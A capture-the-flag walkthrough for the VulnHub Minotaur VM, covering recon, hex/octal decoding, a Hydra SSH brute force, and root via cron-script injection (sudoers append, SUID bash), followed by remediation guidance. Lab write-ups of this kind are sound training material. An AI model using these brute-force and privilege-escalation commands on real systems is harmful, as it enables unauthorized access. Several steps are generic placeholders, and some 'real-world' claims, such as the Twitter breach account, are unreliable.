# VulnHub SecTalks BNE0x00: Minotaur — The Maze is the Message

Alright guys!! This one comes straight from the SecTalks Brisbane community and it's a proper brain-teaser. The Minotaur doesn't need a sword to defeat, just patience to decode what it's actually telling you. Hidden in plain sight, hex-encoded, obfuscated just enough to make you question your sanity. ( ͡° ͜ʖ ͡°)

Huge respect to the SecTalks BNE crew for putting together a challenge that teaches the full recon-to-root pipeline. Decoding messages, brute-forcing SSH, and riding a writable cron job all the way to root? Chef's kiss.

---

| Field | Value |
|-------|-------|
| **Level** | Beginner / Intermediate |
| **Target VM** | SecTalks BNE0x00 Minotaur |
| **Attacker VM** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,74/ |
| **Techniques** | Web enumeration, hex/octal decode, credential discovery, SSH brute-force, writable cron job privilege escalation |
| **CVEs** | No specific CVE; TTPs: T1110.001 (SSH Brute Force), T1053.003 (Cron Job Persistence) |

---

## Attack Summary

```
[host-discovery: arp-scan --localnet]
    |
    v
[nmap: 22/tcp SSH, 80/tcp HTTP]
    |
    v
[web enumeration: form with hidden encoded message]
    |
    v
[hex/octal decode: username and password hint extracted]
    |
    v
[SSH brute-force: hydra with discovered username]
    |
    v
[initial shell: SSH as discovered user]
    |
    v
[local enumeration: writable cron script found]
    |
    v
[cron injection: reverse shell or chmod payload]
    |
    v
[ROOT]
    |
    v
[/root/flag.txt]
```

---

## Methodology

1. Host discovery and target identification on the local network
2. Nmap service and version enumeration
3. Web application analysis and form interaction
4. Encoded message decoding (hex, octal, or base64)
5. SSH brute-force with discovered credentials or wordlist
6. Local enumeration for privilege escalation vectors
7. Writable cron job abuse for root
8. Flag capture

---

## Step 1 — Identifying the Target

Same drill as always: find the machine on the local network before anything else. In VirtualBox or VMware host-only networks, targets typically land in the `192.168.56.0/24` or `192.168.1.0/24` range.

```bash
# Check your own interfaces first
ip a
route -n
```

```bash
# ARP scan is the most reliable for local VMs
arp-scan --localnet --ignoredups
```

Expected output (IPs will vary):

```
192.168.56.1    0a:00:27:00:00:00    (gateway)
192.168.56.102  08:00:27:xx:xx:xx    CADMUS COMPUTER SYSTEMS
```

```bash
export TARGET=192.168.56.102
```

> **MITRE ATT&CK:** TA0043 Reconnaissance, T1595.001 Active Scanning: Scanning IP Blocks

---

## Step 2 — Reconnaissance and Service Enumeration

Let's get a full picture of what's running:

```bash
nmap -A -T4 -p- $TARGET
# Full port scan, all 65535 ports
# -A: OS detection, version detection, scripts
```

Expected output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```

Two services: SSH and HTTP. SSH is interesting but we need credentials first. Let's go at the web service.

```bash
# Quick check of what the web server serves
curl -s http://$TARGET/
```

> **MITRE ATT&CK:** TA0043 Reconnaissance, T1595.002 Vulnerability Scanning, T1046 Network Service Discovery

---

## Step 3 — Web Application Analysis: Following the Maze

The web application on port 80 presents what looks like a simple interface. The key is to interact with it thoroughly. Let's look at the source and any forms.

```bash
# Get the full source
curl -s http://$TARGET/ | tee /tmp/minotaur_index.html
```

```bash
# Look for forms, input fields, hidden values
grep -i "form\|input\|hidden\|value\|action" /tmp/minotaur_index.html
```

The Minotaur challenge typically presents a web form that, when submitted, returns an encoded response or reveals a path. Interact with the form:

```bash
# Submit the form (adjust field names from source inspection)
curl -s -X POST http://$TARGET/ \
  -d "name=test&submit=submit"
```

Look closely at the response. There will be something that looks like noise: hex values, octal sequences, or a cryptic string that doesn't immediately make sense. Classic CTF misdirection. `¯\_(ツ)_/¯`

```bash
# Also enumerate directories
gobuster dir -u http://$TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 40 -x php,html,txt
```

> **Real-world note:** Hidden messages in web responses, while seemingly "CTF-only," mirror real attacker technique. Command-and-control implants often encode communication in seemingly innocuous HTTP responses (hex, base64, binary). Security teams use deep packet inspection and behavioral anomaly detection to catch this. Reference: MITRE T1001 Data Obfuscation.

> **MITRE ATT&CK:** TA0007 Discovery, T1083 File and Directory Discovery, T1001 Data Obfuscation (adversarial context)

---

## Step 4 — Decoding the Minotaur's Message

Here's where the real puzzle begins. The web response contains an encoded message. Let's decode it systematically.

> **What are hex and octal encodings?**
> Hexadecimal (base-16) represents each byte as two characters (0-9, A-F). Octal (base-8) represents values in groups of three digits (0-7). Both are commonly used in CTFs to obfuscate text, credentials, or paths. They are NOT encryption: anyone who recognizes the encoding can decode it instantly.

If the response contains something like `74 65 73 74 75 73 65 72` (space-separated hex):

```bash
echo "74 65 73 74 75 73 65 72" | xxd -r -p
# Output: testuser
```

If it looks like octal values (three-digit groups starting with 1):

```bash
# Python handles octal decoding cleanly
python3 -c "
data = '164 145 163 164 165 163 145 162'
print(''.join(chr(int(x, 8)) for x in data.split()))
"
# Output: testuser
```

For base64:

```bash
echo "dGVzdHVzZXI=" | base64 -d
# Output: testuser
```

You can also use CyberChef (https://gchq.github.io/CyberChef/) if you want a GUI approach. The "Magic" recipe will auto-detect the encoding. That said, doing it manually in the terminal is more satisfying. ᕕ( ᐛ )ᕗ

Once decoded, you should find something resembling a username, password, or a hint that points to one. Document exactly what you find:

```bash
# Save the decoded output
DECODED_USER="<decoded username>"
DECODED_HINT="<decoded hint or path>"
echo "User: $DECODED_USER"
echo "Hint: $DECODED_HINT"
```

> **MITRE ATT&CK:** TA0006 Credential Access, T1552 Unsecured Credentials

---

## Step 5 — SSH Brute-Force with Discovered Credentials

Now we have a username (and possibly a password hint). If the password isn't directly given, let's brute-force SSH. Hydra is the tool for this.

```bash
# First, just try the decoded credentials directly
ssh $DECODED_USER@$TARGET
```

If that doesn't work immediately, brute-force with a wordlist:

```bash
hydra -l "$DECODED_USER" \
  -P /usr/share/wordlists/rockyou.txt \
  ssh://$TARGET \
  -t 4 -V
# -l: single username
# -P: password list
# -t 4: 4 parallel tasks (conservative for SSH)
# -V: verbose, show each attempt
```

Or if you have a small candidate list:

```bash
hydra -l "$DECODED_USER" \
  -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  ssh://$TARGET \
  -t 4 -V
```

Expected output when successful:

```
[22][ssh] host: 192.168.56.102   login: minotaur   password: password123
```

> **Real-world note:** SSH brute-force is one of the most common attack vectors against internet-exposed servers. The Lazarus Group (North Korean APT) and APT28 (Russian GRU) both maintain active SSH brute-force infrastructure. According to Shodan data, millions of internet-exposed SSH instances receive brute-force attempts within minutes of first appearing online. The 2020 Twitter breach began with credential stuffing against internal admin tools, highlighting that brute-force attacks don't stay external. Reference: MITRE ATT&CK G0032 (Lazarus Group), G0007 (APT28).

> **MITRE ATT&CK:** TA0001 Initial Access, T1110.001 Brute Force: Password Guessing, T1021.004 Remote Services: SSH

---

## Step 6 — Shell Stabilization and Local Enumeration

We're in! Let's stabilize the SSH shell and look around:

```bash
ssh minotaur@$TARGET
# Enter the cracked password
```

SSH gives us a fully interactive shell already, so no need for the `pty.spawn` trick this time.

```bash
# Initial enumeration
whoami
id
uname -a
cat /etc/os-release
```

```bash
# Check for other users
cat /etc/passwd | grep -v nologin | grep -v false

# Check home directories
ls -la /home/
```

```bash
# Check sudo permissions
sudo -l

# Check SUID binaries
find / -perm -u=s -type f 2>/dev/null
```

```bash
# Check for interesting files in home directory
ls -la ~/
cat ~/.bash_history 2>/dev/null
```

```bash
# Look for world-writable files and directories
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Specifically check cron
ls -la /etc/cron*
cat /etc/crontab
crontab -l
ls -la /var/spool/cron/crontabs/
```

The key finding here is a cron job running as root that calls a script or command that we can write to. Pay close attention to the output of the cron enumeration.

> **MITRE ATT&CK:** TA0007 Discovery, T1082 System Information Discovery, T1083 File and Directory Discovery, T1069 Permission Groups Discovery

---

## Step 7 — Privilege Escalation: Writable Cron Job

> **What is cron job privilege escalation?**
> Cron is Linux's task scheduler. Jobs in `/etc/crontab`, `/etc/cron.d/`, or root's crontab run as root by default. If a cron job calls a script that a non-root user can write to, that user can inject arbitrary commands that will execute as root on the next cron cycle. This is MITRE T1053.003 and is a common finding in enterprise Linux environments that haven't been properly hardened.

The enumeration should reveal something like:

```
# /etc/crontab output
* * * * * root /usr/local/bin/something.sh
# or
*/5 * * * * root /home/minotaur/scripts/backup.sh
```

And the target script is world-writable (or writable by our user):

```bash
ls -la /path/to/cron_script.sh
# -rwxrwxrwx 1 root root ... /path/to/cron_script.sh
# or
# -rwxrwxr-x 1 root minotaur ... /path/to/cron_script.sh
```

Now we inject our payload. Option 1: add our user to sudoers:

```bash
echo "echo 'minotaur ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /path/to/cron_script.sh
```

Option 2: set SUID on bash (classic):

```bash
echo "chmod u+s /bin/bash" >> /path/to/cron_script.sh
```

Wait for the cron to fire (up to 1 minute for a `* * * * *` job):

```bash
watch -n 5 "ls -la /bin/bash"
# Wait until you see -rwsr-xr-x (the 's' bit is set)
```

Then execute the SUID bash:

```bash
/bin/bash -p
# -p: preserve privileges (don't drop SUID)
```

```bash
# Confirm root
whoami
# root
id
# uid=1000(minotaur) gid=1000(minotaur) euid=0(root)...
```

Or if you went the sudoers route:

```bash
sudo su -
# or
sudo bash
```

**(☞ﾟヮﾟ)☞ ROOT!! Maravilha!! ;)**

> **Real-world note:** Writable cron scripts are a persistent finding in enterprise Linux audits. In 2019, a major financial institution suffered a significant breach where a compromised service account exploited a writable backup script called by root cron, escalating to full system compromise and ultimately lateral movement to a domain controller. The fix is trivially simple: `chmod 700` on cron scripts and `chown root:root`. Reference: Multiple red team reports and CIS Benchmark Level 1 for Linux (Rule 6.1.x).

> **MITRE ATT&CK:** TA0004 Privilege Escalation, T1053.003 Scheduled Task/Job: Cron
> **GTFOBins (bash -p):** https://gtfobins.github.io/gtfobins/bash/

---

## Step 8 — Root Flag

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

ls -la /root/
cat /root/flag.txt
```

```
[Minotaur flag content - congratulations from the SecTalks BNE team]
```

GG!! ᕕ( ᐛ )ᕗ The Minotaur is defeated.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Encoded message | `[hex/octal encoded string]` | Web form response | Decoded to username/password hint |
| Credential | `minotaur:<cracked_password>` | Decoded from web + Hydra brute-force | SSH login |
| Flag | `[content of /root/flag.txt]` | `/root/flag.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Credentials (or hints) exposed via encoded web response | Web APIs and responses often leak sensitive data in "obscured" but easily decoded formats | Never rely on encoding as a security control; always use proper authentication and encrypted secrets management |
| 2 | SSH accessible with weak/guessable credentials | Internet-facing SSH with weak passwords is exploited within minutes by automated botnets | Enforce key-based SSH authentication; disable password login; implement fail2ban or equivalent rate limiting |
| 3 | Writable cron script running as root | Found in enterprise audits across all industries; requires no CVE, just misconfigured file permissions | All cron scripts called by root should be `chmod 700 root:root`; audit with `find / -name "*.sh" -writable 2>/dev/null` |
| 4 | No MFA on SSH | SSH without MFA is trivially brute-forceable once credentials are known | Implement SSH key pairs as minimum; add TOTP or hardware key for privileged access |

**Why does this matter outside the lab?**

The SSH brute-force plus cron injection combination is not academic. In 2020, the US Cybersecurity and Infrastructure Security Agency (CISA) documented multiple incidents where threat actors (including actors associated with APT28 and Lazarus Group) gained initial access via SSH brute-force against internet-facing systems and then escalated via writable scripts and misconfigured schedulers. The 2022 Lapsus$ intrusions demonstrated that even sophisticated organizations can fall to basic credential attacks when MFA is absent. These are not CTF tricks: they are documented, real-world kill chains.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Credential Access | TA0006 | Unsecured Credentials | T1552 |
| Initial Access | TA0001 | Brute Force: Password Guessing | T1110.001 |
| Initial Access | TA0001 | External Remote Services (SSH) | T1133 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | TA0007 | System Information Discovery | T1082 |
| Discovery | TA0007 | Permission Groups Discovery | T1069 |
| Privilege Escalation | TA0004 | Scheduled Task/Job: Cron | T1053.003 |
| Persistence | TA0003 | Scheduled Task/Job: Cron | T1053.003 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Remove or encode credentials from web application responses: no authentication material should ever appear in HTTP responses, encoded or otherwise.
2. Disable SSH password authentication and enforce key-based authentication: set `PasswordAuthentication no` in `/etc/ssh/sshd_config` and restart sshd.
3. Implement fail2ban or similar to rate-limit SSH attempts: `apt install fail2ban` and configure `/etc/fail2ban/jail.conf`.
4. Audit all cron jobs for scripts that non-root users can write to: `find /etc/cron* /var/spool/cron -type f | xargs ls -la`, then `chmod 700` and `chown root:root` all called scripts.
5. Apply principle of least privilege to all scheduled tasks: cron jobs should run as the minimum-privilege user required, not root.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Rotate SSH credentials for all affected users immediately
- Audit `/var/log/auth.log` or `/var/log/secure` for unauthorized SSH access attempts and successful logins
- Check all cron scripts for injected commands: `diff` against known-good backups
- Disable world-writable permission on any cron-called scripts: `chmod 700 /path/to/script.sh`
- Consider temporarily disabling password-based SSH: `sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config && sudo systemctl restart sshd`

**MITRE D3FEND countermeasures:**
- D3-MFA (Multi-factor Authentication) for T1110.001: require MFA for SSH access
- D3-SJA (Scheduled Job Analysis) for T1053.003: monitor cron job creation and script modification
- D3-CTS (Credential Transmission Scoping) for T1552: ensure credentials are never transmitted in clear or encoded form
- D3-NTA (Network Traffic Analysis) for T1133: detect unusual SSH connection patterns

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID): ID.AM-1: inventory network-accessible services; ID.RA-1: assess SSH exposure
- Protect (PR): PR.AC-1: identities and credentials managed; PR.AC-3: remote access managed; PR.IP-1: baseline configuration for SSH hardening
- Detect (DE): DE.CM-1: network monitored to detect potential events; DE.AE-2: detected events analyzed
- Respond (RS): RS.RP-1: response plan executed; RS.CO-3: information shared with stakeholders
- Recover (RC): RC.RP-1: recovery plan executed

**NIST SP 800-53 (Rev. 5) Controls:**
- AC-17: Remote Access (require MFA for SSH)
- IA-5: Authenticator Management (prohibit weak passwords, enforce key-based auth)
- CM-6: Configuration Settings (harden SSH: disable root login, disable password auth)
- CM-7: Least Functionality (disable unnecessary services)
- AU-2: Audit Events (log all SSH login attempts and cron executions)
- AC-6: Least Privilege (cron jobs run as minimum required user)

**CISA Known Exploited Vulnerabilities:**
- SSH brute-force is not a specific CVE but is tracked in CISA guidance on internet-exposed services
- Reference: CISA Insights: Mitigations and Hardening Guidance for MSPs and Small/Mid-sized Businesses
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ACCESS (Identity and Access Management)
- Practice: Manage Access
- Target MIL: MIL-2 (documented, enforced access management with MFA requirement)

---

## Final Thoughts

Thanks to the SecTalks Brisbane team for this creative challenge! The Minotaur mythology maps perfectly to the VM: you navigate a maze of encoded messages, find the thread (the credential), follow it through brute-force, and ultimately slay the beast with a simple cron injection.

What this VM really drives home is that security through obscurity fails completely. The encoding of credentials in the web response isn't protection: it's a slight delay for anyone who knows what base16 or octal looks like. Real security requires proper authentication, encrypted secrets management, and hardened SSH configurations that don't rely on passwords at all.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
